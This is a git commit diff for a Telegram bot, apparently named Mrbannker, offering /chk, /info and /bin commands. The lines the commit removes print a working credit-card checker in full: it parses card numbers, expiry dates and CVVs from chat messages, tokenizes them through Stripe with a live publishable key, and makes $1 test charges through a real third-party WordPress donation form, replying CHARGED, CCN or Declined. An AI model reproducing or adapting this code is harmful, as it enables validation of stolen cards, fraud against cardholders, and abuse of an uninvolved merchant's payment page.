5bc7f346d6d276922f3cf88eb82b647debdd1cdc
chrichrilaubie <chrichrilaubie@gmail.com>
2025-03-13 04:00:32 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,3 +1,59 @@
+import logging 
+import os
+import requests
+import time
+import string
+import random
+import yaml
+import asyncio
+import re
+
+from aiogram import Bot, Dispatcher, executor, types
+from aiogram.utils.exceptions import Throttled
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from bs4 import BeautifulSoup as bs
+
+# Configure vars get from env or config.yml
+CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
+TOKEN = os.getenv('TOKEN', CONFIG['token'])
+BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
+PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
+OWNER = int(os.getenv('OWNER', CONFIG['owner']))
+ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))
+
+# Initialize bot and dispatcher (Ensure this happens before handlers)
+storage = MemoryStorage()
+bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
+dp = Dispatcher(bot, storage=storage)
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+
+# BOT INFO
+loop = asyncio.get_event_loop()
+
+bot_info = loop.run_until_complete(bot.get_me())
+BOT_USERNAME = bot_info.username
+BOT_NAME = bot_info.first_name
+BOT_ID = bot_info.id
+
+# Your other code below (handlers, functions, etc.)
+# For example:
+@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
+async def helpstr(message: types.Message):
+    # await message.answer_chat_action('typing')
+    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
+    btns = types.InlineKeyboardButton("Bot Source", url="https://github.com/chrichrilaubie/Mrbannker")
+    keyboard_markup.row(btns)
+    FIRST = message.from_user.first_name
+    MSG = f'''
+Hello {FIRST}, Im {BOT_NAME}
+U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
+Cmds /chk /info /bin'''
+    await message.answer(MSG, reply_markup=keyboard_markup,
+                        disable_web_page_preview=True)
+
+# Example /chk command handler
 @dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
     await message.answer_chat_action('typing')
@@ -11,140 +67,9 @@ async def ch(message: types.Message):
         await message.reply('<b>Too many requests!</b>\n'
                             f'Blocked For {ANTISPAM} seconds')
     else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
+        # Your card checking code here
+        pass
 
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
-
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        if await is_card_valid(ccn) != True:
-            return await message.reply('<b>Invalid luhn algorithm</b>')
-
-        # BIN Check (e.g., via binlist.net)
-        bin_info = bin_check(ccn[:6])
-
-        # Request data to Stripe API
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
-
-        m = s.post('https://m.stripe.com/6', headers=headers)
-        r = m.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
-
-        postdata = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
-
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        pr = s.post('https://api.stripe.com/v1/tokens',
-                    data=postdata, headers=HEADER)
-        Id = pr.json()['id']
-        if pr.status_code != 200:
-            return await message.reply("<b>Site is Dead</b>")
-        
-        nonce = s.get("https://www.hwstjohn.com/pay-now/")
-        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
-        
-        load = {
-            "action": "wp_full_stripe_payment_charge",
-            "formName": "default",
-            "formNonce": form,
-            "fullstripe_name": Name,
-            "fullstripe_email": Email,
-            "fullstripe_custom_amount": "1",
-            "fullstripe_amount_index": 0,
-            "stripeToken": Id
-        }
-
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        # POST request to handle the payment processing
-        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
-                    data=load, headers=header)
-        msg = rx.json()['msg']
-        
-        toc = time.perf_counter()
-
-        # Handling different response scenarios
-        if 'true' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CHARGED 1$
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'security code' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CCN
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'false' in rx.text:
-            return await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #Declined
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {rx.text}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
+# Start the bot
+if __name__ == '__main__':
+    executor.start_polling(dp, skip_updates=True, loop=loop)
